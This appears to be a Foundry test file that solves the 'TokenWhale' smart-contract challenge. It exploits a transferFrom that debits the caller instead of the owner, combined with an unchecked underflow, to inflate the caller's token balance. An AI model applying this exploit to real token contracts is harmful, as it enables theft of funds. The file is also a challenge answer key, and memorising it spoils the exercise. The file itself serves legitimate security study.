// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TokenWhale.sol";

contract TokenWhaleTest is Test {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;
    // Feel free to use these random addresses
    address constant Alice = address(0x5E12E7);
    address constant Bob = address(0x5311E8);
    address constant Pete = address(0x5E41E9);

    function setUp() public {
        // Deploy contracts
        tokenWhale = new TokenWhale(address(this));
        exploitContract = new ExploitContract(tokenWhale);
    }

    // Use the instance tokenWhale and exploitContract
    // Use vm.startPrank and vm.stopPrank to change between msg.sender
    function testExploit() public {
        // Put your solution here

        // 1. Transfer some tokens among the accounts
        tokenWhale.transfer(Alice, 400);
        tokenWhale.transfer(Bob, 400);

        assertEq(tokenWhale.balanceOf(Alice), 400);
        assertEq(tokenWhale.balanceOf(Bob), 400);
        assertEq(tokenWhale.balanceOf(address(this)), 200);

        // 2. Approve this contract to spend Alice's tokens
        vm.prank(Alice);
        tokenWhale.approve(address(this), 400);

        // 3. Transfer tokens from Alice to Bob
        //
        // The `transferFrom` method contains an error in the code because of which when
        // transferring tokens from Alice to Bob, the tokens are not debited from Alice's balance,
        // but are debited from msg.sender's balance
        //
        // The `_transfer` method relies on checks in calling methods and allows overflow balance.
        // This is what we use to overflow the msg.sender balance
        tokenWhale.transferFrom(Alice, Bob, 400);

        // 4. Check the balances
        // 4.1. Alice's balance is the same beacuse of the error in the `transferFrom` method
        assertEq(tokenWhale.balanceOf(Alice), 400);
        // 4.2. Bob's balance is 800 as expected
        assertEq(tokenWhale.balanceOf(Bob), 400 + 400);
        // 4.3. The contract's balance is now 2^256 - 200 because of the overflow
        assertEq(
            tokenWhale.balanceOf(address(this)),
            type(uint256).max - 200 + 1
        );

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenWhale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
